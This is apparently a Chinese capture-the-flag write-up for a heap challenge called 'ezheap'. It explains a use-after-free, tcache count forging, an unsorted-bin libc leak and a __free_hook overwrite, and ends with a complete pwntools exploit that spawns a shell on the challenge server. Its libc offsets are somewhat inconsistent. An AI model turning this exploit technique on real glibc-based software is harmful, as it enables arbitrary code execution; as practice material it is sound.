---
title: 'UAF+heap基础'
published: 2026-09-17
description: '啊啊啊啊啊弄懂了跟蛇了一样有没有懂的'
author: 'dxfaker'
image: '/images/post/屏幕截图 2026-09-17 223103_图片清晰化.png'
tags: ['pwn','wp']
category: 'wp'
toc: true
---

# 开堆

 这个题我搞了两天（并非无时无刻都在搞），不过学到挺多东西的

有问题，后面会修

题目

https://ctf2.dasctf.com/dashboard/practice/b9bbb32f-f186-458f-b90b-12440c0f6aea?returnTo=%2Fdashboard%2Fpractice%3Fview%3Dmy&tab=challenges&challenge=9420dabd-667c-4205-95a6-365f68794e71

# ezheap

checksec

```
   Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

哎呀，骸死我力

看main函数逻辑

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init_buf(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v4);
      if ( v4 != 4 )
        break;
      edit();
    }
    if ( v4 > 4 )
      break;
    switch ( v4 )
    {
      case 3:
        show();
        break;
      case 1:
        add();
        break;
      case 2:
        delete();
        break;
      default:
        goto LABEL_12;
    }
  }
LABEL_12:
  puts("Invalid");
  return 0;
}
```

看menu

```c
unsigned __int64 menu()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("1.add note");
  puts("2.delete note");
  puts("3.show note");
  puts("4.edit note");
  puts(">>");
  return __readfsqword(0x28u) ^ v1;
}
```

那就是输入神秘小数字

先看show逻辑

```c
unsigned __int64 show()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  idx = read_idx();
  if ( idx < 0x10 && notebook[idx] )
    puts(*(const char **)(notebook[idx] + 24LL));
  else
    puts("Invalid index");
  return __readfsqword(0x28u) ^ v2;
}
```

索引的检查还是在的

```c
 idx < 0x10 && notebook[idx]
```

但是有非常诱人的puts啊

再看add

```c
unsigned __int64 add()
{
  char buf; // [rsp+3h] [rbp-1Dh] BYREF
  int i; // [rsp+4h] [rbp-1Ch]
  unsigned int idx; // [rsp+8h] [rbp-18h]
  int size; // [rsp+Ch] [rbp-14h]
  _BYTE *v5; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  idx = read_idx();
  if ( idx >= 0x10 || notebook[idx] )
  {
    puts("Invalid index");
  }
  else
  {
    notebook[idx] = malloc(0x20u);
    size = read_size();
    v5 = malloc(size);
    notesize[idx] = size;
    *(_QWORD *)notebook[idx] = size;
    *(_QWORD *)(notebook[idx] + 24LL) = v5;
    *(_QWORD *)(notebook[idx] + 8LL) = 0;
    *(_QWORD *)(notebook[idx] + 16LL) = 0;
    puts("write the note: ");
    for ( i = 0; i < size; ++i )
    {
      read(0, &buf, 1u);
      if ( buf == 10 )
        break;
      v5[i] = buf;
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```

只允许在空的地方添加，然后申请0x20进行一个写入

```c
notebook[idx] = malloc(0x20u);          // 分配 32 字节元数据块
*(_QWORD *)notebook[idx] = size;         // 偏移 0x00：笔记大小
*(_QWORD *)(notebook[idx] + 24LL) = v5;  // 偏移 0x18：内容指针
*(_QWORD *)(notebook[idx] + 8LL) = 0;    // 偏移 0x08：其他字段，初始为0
*(_QWORD *)(notebook[idx] + 16LL) = 0;   // 偏移 0x10：其他字段，初始为0
```

v5 = malloc(size);也就是说v5得到的是他的指针，从0x18开始往后写(堆是往高地址写入)然后再开始逐个读入

总之，是存入到notebook里面去了

然后是delete

```c
unsigned __int64 delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  idx = read_idx();
  if ( idx < 0x10 && notebook[idx] )
    free((void *)notebook[idx]);
  else
    puts("Invalid index");
  return __readfsqword(0x28u) ^ v2;
}
```

直接释放内存的来

最后是edit

```c
unsigned __int64 edit()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  idx = read_idx();
  if ( idx < 0x10 && notebook[idx] )
  {
    if ( notesize[idx] == *(_QWORD *)notebook[idx] )
    {
      puts("enter content: ");
      read(0, *(void **)(notebook[idx] + 24LL), notesize[idx]);// ; _QWORD notebook[16]
    }
    else
    {
      puts("bad hacker!");
    }
  }
  else
  {
    puts("Invalid index");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

限制编辑功能，只能对特定的区块写入其先前大小的内容

回顾checksec,GOT知识可读，不能利用覆写劫持函数调用，但是可以来泄露真实地址

还需要泄露canary

然后就是SHSTK/IBT这个大粪了。影子栈和间接分支跟踪启动不过有可能是标记，内核中可能并没有启动，所以需要动态调试测试一下

```bash
pwndbg> info cet
Undefined info command: "cet".  Try "help info".
pwndbg> show cet
Undefined show command: "cet".  Try "help show".
pwndbg> quit
```

没有就是没有，打个标记闹嘛了

pwndbg> info files

```bash
        file type elf64-x86-64.
        Entry point: 0x1140
        0x0000000000000318 - 0x0000000000000334 is .interp
        0x0000000000000338 - 0x0000000000000358 is .note.gnu.property
        0x0000000000000358 - 0x000000000000037c is .note.gnu.build-id
        0x000000000000037c - 0x000000000000039c is .note.ABI-tag
        0x00000000000003a0 - 0x00000000000003d0 is .gnu.hash
        0x00000000000003d0 - 0x0000000000000550 is .dynsym
        0x0000000000000550 - 0x0000000000000631 is .dynstr
        0x0000000000000632 - 0x0000000000000652 is .gnu.version
        0x0000000000000658 - 0x0000000000000698 is .gnu.version_r
        0x0000000000000698 - 0x0000000000000788 is .rela.dyn
        0x0000000000000788 - 0x0000000000000848 is .rela.plt
        0x0000000000001000 - 0x000000000000101b is .init
        0x0000000000001020 - 0x00000000000010b0 is .plt
        0x00000000000010b0 - 0x00000000000010c0 is .plt.got
        0x00000000000010c0 - 0x0000000000001140 is .plt.sec
        0x0000000000001140 - 0x0000000000001935 is .text
        0x0000000000001938 - 0x0000000000001945 is .fini
        0x0000000000002000 - 0x000000000000209d is .rodata
        0x00000000000020a0 - 0x0000000000002124 is .eh_frame_hdr
        0x0000000000002128 - 0x0000000000002330 is .eh_frame
        0x0000000000003d80 - 0x0000000000003d88 is .init_array
        0x0000000000003d88 - 0x0000000000003d90 is .fini_array
        0x0000000000003d90 - 0x0000000000003f80 is .dynamic
        0x0000000000003f80 - 0x0000000000004000 is .got
        0x0000000000004000 - 0x0000000000004010 is .data
        0x0000000000004020 - 0x0000000000004100 is .bss
```

然后

```bash
pwndbg> !readelf -r ./4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc

Relocation section '.rela.dyn' at offset 0x698 contains 10 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000003d80  000000000008 R_X86_64_RELATIVE                    1220
000000003d88  000000000008 R_X86_64_RELATIVE                    11e0
000000004008  000000000008 R_X86_64_RELATIVE                    4008
000000003fd8  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000003fe0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000003fe8  000700000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000003ff0  000c00000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
000000003ff8  000e00000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0
000000004020  000d00000005 R_X86_64_COPY     0000000000004020 stdout@GLIBC_2.2.5 + 0
000000004030  000f00000005 R_X86_64_COPY     0000000000004030 stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x788 contains 8 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000003f98  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000003fa0  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000003fa8  000400000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000003fb0  000500000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000003fb8  000800000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000003fc0  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000003fc8  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 atoi@GLIBC_2.2.5 + 0
000000003fd0  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
```

可以拿到

| free             | `0x3f98` |
| ---------------- | -------- |
| puts             | `0x3fa0` |
| __stack_chk_fail | `0x3fa8` |
| read             | `0x3fb0` |
| malloc           | `0x3fb8` |
| setvbuf          | `0x3fc0` |
| atoi             | `0x3fc8` |
| __isoc99_scanf   | `0x3fd0` |

偏移有了，那么基址也有了

然后b main,r,wmmap

```bash
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000       0 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x555555555000     0x555555556000 r-xp     1000    1000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x555555556000     0x555555557000 r--p     1000    2000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x555555557000     0x555555558000 r--p     1000    2000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x555555558000     0x555555559000 rw-p     1000    3000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7db1000 r-xp   189000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db1000     0x7ffff7e00000 r--p    4f000  1b1000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e00000     0x7ffff7e04000 r--p     4000  1ff000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e04000     0x7ffff7e06000 rw-p     2000  203000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e06000     0x7ffff7e13000 rw-p     d000       0 [anon_7ffff7e06]
    0x7ffff7fb0000     0x7ffff7fb3000 rw-p     3000       0 [anon_7ffff7fb0]
    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000       0 [anon_7ffff7fbd]
    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000       0 [vvar]
    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000       0 [vdso]
    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
```

libc基址拿到了，可以算puts了

```bash
 0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
```

真实地址等于基址+偏移

```bash
pwndbg> x/gx 0x555555557fa0
0x555555557fa0 <puts@got.plt>:  0x00007ffff7c87cc0
```

那不如尝试一下任意地址读

test

```python
from pwn import *

context.log_level = 'info'

p = process('./4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc')

p.sendlineafter(b'>>', b'1')
p.sendlineafter(b'enter idx(0~15):', b'0')
p.sendlineafter(b'enter size:', b'32')
p.sendlineafter(b'write the note:', b'AAAA')

gdb.attach(p, '''
b *main+140     
c
''')

# 此时程序会停在断点，在 GDB 中操作完后，再在 pwntools 中继续
p.interactive()
```

那么就是

```bash
pwndbg> p/x &notebook
$1 = 0x5c9613baf080
pwndbg> p/x *(void**)&notebook
$2 = 0x5c96252af2a0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x5c9613bab000     0x5c9613bac000 r--p     1000       0 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x5c9613bac000     0x5c9613bad000 r-xp     1000    1000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x5c9613bad000     0x5c9613bae000 r--p     1000    2000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x5c9613bae000     0x5c9613baf000 r--p     1000    2000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x5c9613baf000     0x5c9613bb0000 rw-p     1000    3000 4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc
    0x5c96252af000     0x5c96252d0000 rw-p    21000       0 [heap]
    0x74b5e7c00000     0x74b5e7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x74b5e7c28000     0x74b5e7db1000 r-xp   189000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x74b5e7db1000     0x74b5e7e00000 r--p    4f000  1b1000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x74b5e7e00000     0x74b5e7e04000 r--p     4000  1ff000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x74b5e7e04000     0x74b5e7e06000 rw-p     2000  203000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x74b5e7e06000     0x74b5e7e13000 rw-p     d000       0 [anon_74b5e7e06]
    0x74b5e7fbd000     0x74b5e7fc0000 rw-p     3000       0 [anon_74b5e7fbd]
    0x74b5e7fca000     0x74b5e7fcc000 rw-p     2000       0 [anon_74b5e7fca]
    0x74b5e7fcc000     0x74b5e7fcd000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x74b5e7fcd000     0x74b5e7ff8000 r-xp    2b000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x74b5e7ff8000     0x74b5e8002000 r--p     a000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x74b5e8002000     0x74b5e8004000 r--p     2000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x74b5e8004000     0x74b5e8006000 rw-p     2000   38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffe25bf9000     0x7ffe25c1b000 rw-p    22000       0 [stack]
    0x7ffe25cfd000     0x7ffe25d01000 r--p     4000       0 [vvar]
    0x7ffe25d01000     0x7ffe25d03000 r-xp     2000       0 [vdso]
pwndbg> set *(void**)(0x5c96252af2a0 + 0x18) = 0x5c9613baefa0
pwndbg> x/gx 0x5c96252af2a0 + 0x18
0x5c96252af2b8: 0x00005c9613baefa0
pwndbg> c
```

回看menu界面

```bash
──3
enter idx(0~15):
$ 0
\xc0|\xc8\xe7\xb5t
1.add note
2.delete note
3.show note
4.edit note
>>
$
```

输入3执行的show操作已经爆地址了(二进制转小端序十六进制再补为8字节，高位补0也就是0x000074b5e7c87cc0再跟先前的基址+偏移对比发现确实能够泄露)

能泄露真实地址了PIE的问题就解决了

现在就是指向真实地址的问题

你都ezheap了，那我默认可以UAF了

> 在C语言中，我们通过malloc族函数进行堆块的分配，用free()函数进行堆块的释放。在释放堆块的过程中，如果没有将释放的堆块置空，这时候，就有可能出现use after free的情况。

 在这个题目中的具体体现就是你用了free但是没有让这个元素清0

那出现free在哪，是不是delete

```c
unsigned __int64 delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  idx = read_idx();
  if ( idx < 0x10 && notebook[idx] )
    free((void *)notebook[idx]);
  else
    puts("Invalid index");
  return __readfsqword(0x28u) ^ v2;
}
```

是不是符合呢，没毛吧

那现在就是利用思路了

先来看看**`__free_hook` 和 `__malloc_hook`**这两个ldx还在不在

```bash
 strings -a ./0eab6a762499f93c406653ed436eff824849add94e0adba4413572f2a3b7faa0.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
```

活了，居然还能用

先丢一下前置[堆内存概述、Tcache Poisoning - 楽の栈](https://blog.leyi.live/archives/tcache)

以及补充

>### 1. __free_hook
>
>- **类型**：`void (*__free_hook)(void *ptr, const void *caller)`
>- **作用**：当 `free(ptr)` 被调用时，glibc 会检查 `__free_hook` 是否非空。如果非空，就**转而调用 `__free_hook(ptr, caller)`**，而不再执行默认的释放逻辑。
>- **利用**：若将 `__free_hook` 覆盖为 `system`，那么 `free(ptr)` 就会变成 `system(ptr)`。如果 `ptr` 指向字符串 `"/bin/sh"`，就执行了 `system("/bin/sh")`，直接获得 shell。
>
>### 2. __malloc_hook
>
>- **类型**：`void *(*__malloc_hook)(siz0e_t size, const void *caller)`
>- **作用**：当 `malloc(size)` 被调用时，如果 `__malloc_hook` 非空，就调用它，并用其返回值作为分配结果。
>- **利用**：可以覆盖为 `system` 或 `one_gadget`，但参数是 `size`，不太直接。更常见的是配合 `__free_hook` 使用。

主要是这俩在libc的可写数据段，不受Full RELRO影响，发改后下一次free/malloc就直接执行指定函数了，加上UAF的缘故，可以让malloc返回__free_hook,然后再写入system

~~我就在怎么泄露libc卡了约等于1天(实则有别的事情去干导致24小时后才开始再度编辑)~~

各个私募bin的优先级

>tcache 范围：chunk size ≤ 0x410（即 request ≤ 0x400），每 bin 最多 7 个，LIFO。
>fastbin 范围：chunk size ≤ 0x80（即 request ≤ 0x78），LIFO，不合并。
>small bin：chunk size < 0x400（1024 B）。
>large bin：chunk size ≥ 0x400。
>fastbin 合并阈值 FASTBIN_CONSOLIDATION_THRESHOLD = 0x10000（64KB）。

1. Free 时的优先级（从高到低）
   tcache：若 size ≤ 0x410 且该 bin 的 count < 7 → 直接 LIFO 链入 tcache（最快，不合并）。
   fastbin：否则，若 size ≤ 0x80 → 链入 fastbin（不合并）。但触发以下任一条件会把所有 fastbin 倒进 unsorted 并合并：
   本次释放后空闲总量 ≥ 0x10000；
   释放块与 top chunk 相邻。
   unsorted bin：否则先与前/后空闲块合并，合并后若紧邻 top 就并入 top，否则放入 unsorted bin。
2. Malloc 时的优先级（从高到低）
   tcache：精确 size 匹配且 count > 0 → 弹一个（LIFO，不切割）。
   fastbin：精确 size 匹配且非空 → 弹一个（LIFO）。
   small bin：对应 bin 非空 → 弹一个（FIFO）。
   unsorted bin：扫描它：
   若只有一块且大小正好等于请求（且不是 last_remainder）→ 直接返回；
   否则把块按大小分拣回 small/large bin，途中遇到正好大小的块就顺手拿走；
   扫描完还没分到再走下一步。

现在讨论泄露libc的方法

一般来说，我们考虑unsorted bin

> unsorted 块空闲时 fd/bk 指向 main_arena（在 libc 里），读它就能算 libc 基址

那么怎么让free()后的chunk落入到unsorted bin呢

1. 大小要"绕过" tcache / fastbin
2. 伪造块的 nextchunk 必须落在合法映射内存里
3. prev_inuse 位不能引爆炸合

对于第一条，unsorted 块要么 size > 0x410（天然绕开），要么把对应 tcache bin 填满 7 个让它"溢出"到 unsorted。那塞7个肯定很麻烦，不如直接改tcache的计数让他以为是7就好了（tcache 计数布局：只对 glibc 2.26+ 通用

> counts[idx] 就是当前 tcache 中第 idx 号 bin 里"挂着几个空闲块"的整数计数（0 ~ 7）。它本身不存指针（指针在 entries[idx] 链表里）。

```c
typedef struct tcache_perthread_struct {
  uint16_t counts[64];        // 偏移 0，每个 2 字节，共 128B
  tcache_entry *entries[64];  // 偏移 128，每个 8 字节
} tcache_perthread_struct;

```

这里是检查(glibc _int_free)

```c
if (tcache != NULL && tc_idx < mp_.tcache_bins
    && tcache->counts[tc_idx] < mp_.tcache_count)   // mp_.tcache_count == 7
  { tcache_put (p, tc_idx); return; }

```

counts 属于 tcache_perthread_struct，而它是 malloc 自己分配的,且tcache_init 负责 malloc 出包含 counts 的 tcache_perthread_struct，之后所有对 counts 的增减都由 tcache_put/tcache_get 完成

```c
// 全局/线程局部：指向那块结构体的指针，初始为 NULL
static __thread tcache_t *tcache = NULL;

// 结构体定义：counts 是第一个成员，紧跟 entries
typedef struct tcache_perthread_struct {
  uint16_t counts[TCACHE_MAX_BINS];        // ← 就是它，偏移 0
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_t;

```

在malloc时

```c
// 第一次 malloc 时调用，创建并初始化整块结构
static void tcache_init(void) {
  mchunkptr tc_chunk = _int_malloc(&main_arena,
                                   sizeof(tcache_perthread_struct)); // 0x280 字节
  tcache_t *tc = (tcache_t *) chunk2mem(tc_chunk);
  memset(tc, 0, sizeof(tcache_t));   // counts 全部清零
  tcache = tc;                        // TLS 指针指向这块堆
}

```

以及

```
tc_idx = (chunksize - MINSIZE) / MALLOC_ALIGNMENT
```

你又要大于0x80，又要合法映射，还要0x10对齐，那我取0x90不就好了

0x90套公式计算编号是7

那就是令counts[7]==7

```c
heap_base+0x00  首块 prev_size
heap_base+0x08  首块 size
heap_base+0x10  ┌─ tcache_perthread_struct 起点 = counts[0] ─┐
                │ +0x00  counts[0]  (size 0x20)              │
                │ +0x02  counts[1]  (size 0x30)              │
                │  ...                                       │
                │ +0x0e  counts[7]  (size 0x90)  ← 写7的位置  │
                │  ...                                       │
                │ +0x7e  counts[63]                          │
                └────────────────────────────────────────────┘
heap_base+0x80  entries[0..63]  (指针数组, 8字节每项)
heap_base+0x290 note0 的块 A 的 chunk 头
heap_base+0x2a0 A 的用户数据

```

counts在堆上的位置为heap_base + 0x10 (跳过首块头，到 tcache 结构体) + 0x2*7 (counts 每个 2 字节, idx 7)

又因为只允许0x30大小的chunk，所以考虑造一个fake chunk

那怎么造呢

需要的是在free之后悬空一个0x90的chunk出来，glibc来free的时候读的是size，所以现在考虑怎么更改size

呵呵那就再复习一下吧

```c
低地址                                           高地址
┌───────────────chunk 头 (共 0x10) ───────────────┐┌── 用户区 ──┐
│ prev_size (8B)          │ size 字段 (8B)         │← notebook[5] 指向这里
↑                         ↑
chunk起点                  size 字段位置
= notebook[5]-0x10         = notebook[5]-0x8

```

那就是notebook[5] - 0x8

所以利用UAF直接写(UAF太鸡巴好用了我说)

 然后再free掉之后就可以拥有0x90的chunk了

天然的双链表使得这个孤儿chunk的fd带来了~~libc的地址~~ libc 的 main_arena+0x60(main_arena_off = libc.symbols['main_arena'] ,不同版本下 unsorted bin 泄露偏移 = bins[0] 在 main_arena 的偏移)

以及libc_base = leak - main_arena_off - bins0_off

那我们就拿到libc地址了

那现在就可以利用UAF进行改写hook然后跳转了

再看看system以及/bin/sh

```bash
(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/ezheap$ strings -a -t x ./0eab6a762499f93c406653ed436eff824849add94e0adba4413572f2a3b7faa0.6 | grep '/bin/sh'
 1b45bd /bin/sh
(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/ezheap$ readelf -s ./0eab6a762499f93c406653ed436eff824849add94e0adba4413572f2a3b7faa0.6 | grep system
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

```python
__free_hook_addr = libc_addr + 0x1cce48   # __free_hook 在 libc 里的偏移
system_addr      = libc_addr + 0x30290    # system 在 libc 里的偏移
```

那现在就是改写了

```python
# 先算运行时绝对地址（必须拿到 libc_base 后才有）
__free_hook_addr = libc_base + 0x1cce48   # = libc.symbols['__free_hook']
system_addr      = libc_base + 0x30290    # = libc.symbols['system']

pwrite(__free_hook_addr, p64(system_addr))  # 把 __free_hook 改成 system

```

ok下面是exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

OFF_UNSORTED = 0x60

debug = 0
if debug:
    p = process('./4e452722c6daaa4ba05c309156c3303a7ef28d6428f24a8b123dd0e797ed64fc')
else:
    p = remote("e167a513c13a7b93f197ce55.tcp-ctf2.dasctf.com", 9999, ssl=True,
               sni="e167a513c13a7b93f197ce55.tcp-ctf2.dasctf.com")

def padd(idx, size, content):
    p.recvuntil(b'>>\n'); p.sendline(b'1')
    p.recvuntil(b'idx(0~15): '); p.sendline(str(idx).encode())
    p.recvuntil(b'size: '); p.sendline(str(size).encode())
    p.recvuntil(b'note: '); p.sendline(content)

def pdelete(idx):
    p.recvuntil(b'>>\n'); p.sendline(b'2')
    p.recvuntil(b'idx(0~15): '); p.sendline(str(idx).encode())

def pshow(idx):
    p.recvuntil(b'>>\n'); p.sendline(b'3')
    p.recvuntil(b'idx(0~15): '); p.sendline(str(idx).encode())

def pedit(idx, content):
    p.recvuntil(b'>>\n'); p.sendline(b'4')
    p.recvuntil(b'idx(0~15): '); p.sendline(str(idx).encode())
    p.recvuntil(b'content: '); p.send(content)

def pwrite(addr, val):
    pedit(2, p64(0x20) + b'\x00'*0x10 + p64(addr))
    pedit(0, val)

def pread(addr):
    pedit(2, p64(0x20) + b'\x00'*0x10 + p64(addr))
    pshow(0)

def attack():
    padd(3, 0x20, b''); padd(0, 0x20, b''); padd(1, 0x20, b'')
    pdelete(3); pdelete(0); pdelete(1)
    padd(2, 0x20, b'')
    pshow(2); p.recvuntil(b'\n')
    heap3 = u64(p.recv(6).ljust(8, b'\x00'))

    heap_base = heap3 & ~0xfff
    note5 = heap3 + 0x28 + 6*0x30 + 8

    pwrite(heap_base + 0x10 + 0x2*7, p64(7))

    padd(4, 0x28, b'A'*0x20 + p64(0x30))
    padd(5, 0x70, b'')

    pwrite(note5 - 8,    p64(0x91))
    pwrite(note5 + 0x88, p64(0x21))

    pdelete(5)
    pread(note5); p.recvuntil(b'\n')
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['main_arena'] - OFF_UNSORTED

    free_hook = libc.symbols['__free_hook']
    system    = libc.symbols['system']

    pwrite(heap3, b'/bin/sh\x00')
    pwrite(free_hook, p64(system))
    pdelete(4)
    p.interactive()

attack()

```



















